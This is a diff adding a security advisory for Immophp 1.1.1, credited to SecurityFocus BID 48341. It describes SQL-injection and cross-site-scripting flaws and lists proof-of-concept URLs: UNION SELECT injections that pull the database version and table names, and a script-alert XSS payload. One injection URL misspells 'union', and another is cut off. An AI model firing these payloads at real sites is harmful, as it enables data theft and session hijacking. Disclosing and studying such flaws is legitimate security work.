@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/48341/info
+
+Immophp is prone to a cross-site scripting vulnerability and multiple SQL-injection vulnerabilities because the application fails to sufficiently sanitize user-supplied input.
+
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Immophp 1.1.1 is vulnerable; other versions may also be affected. 
+
+SQL-injection:
+
+http://www.example.com/index.php?page=-2%20uniuon%20select%201,2,3,version(),5--
+http://www.example.com/annonce_detail.php?annonce=-2%20union%20all%20select%20group_concat(table_name)%20from%20information_schema.tables%20where%
+
+Cross-site scripting:
+
+http://www.example.com/annonce.php?secteur= %3cscript%3ealert%3c&#039;31337&#039;%3e%3b%3c%2fscript%3e
+
